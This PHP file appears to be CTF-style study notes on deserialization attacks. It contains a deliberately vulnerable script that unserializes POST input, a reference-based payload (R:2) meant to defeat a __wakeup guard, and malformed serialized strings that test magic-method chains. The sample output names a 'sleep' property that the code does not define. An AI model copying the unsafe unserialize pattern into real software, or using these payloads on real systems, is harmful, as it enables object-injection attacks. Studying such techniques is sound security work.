<?php

class KeyPort1{
    public $key;

    public function __destruct()
    {
        $this->key=False;
        if(!isset($this->wakeup)||!$this->wakeup){
            echo "You get it!";
        }
    }

    public function __wakeup(){
        $this->wakeup=True;
    }

}

if(isset($_POST['pop'])){

    @unserialize($_POST['pop']);

}
?>

<?php

class KeyPort {
    public $key;

    public function __destruct() {

    }
}

$keyport = new KeyPort();
$keyport->key = &$keyport->wakeup;
echo serialize($keyport);

# O:7:"KeyPort":2:{s:3:"key";N;s:5:"sleep";R:2;}

####   序列化引用
/*
    R:2 是序列化引用
    (1) O:7:"KeyPort":2:{...}
    (2) s:3:"key";N
    (3) s:5:"sleep";R:2

    所以上面的代码，就是将wakeup的地址指向key的地址，当key修改为false的时候，wakeup的值也成了false

*/

?>




<?php

class B {
    public function __call($f,$p) {
        echo "B::__call($f,$p)\n";
    }
    public function __destruct() {
        echo "B::__destruct\n";
    }
    public function __wakeup() {
        echo "B::__wakeup\n";
    }
}

class A {
    public function __destruct() {
        echo "A::__destruct\n";
        $this->b->c();
    }
}

// unserialize('O:1:"A":1:{s:1:"b";O:1:"B":0:{}}');


// unserialize('O:1:"A":1:{s:1:"b";O:1:"B":0:{};}');
// unserialize('O:1:"A":1:{s:1:"b";O:1:"B":0:{}');
// unserialize('O:1:"A":2:{s:1:"b";O:1:"B":0:{}}');


?>
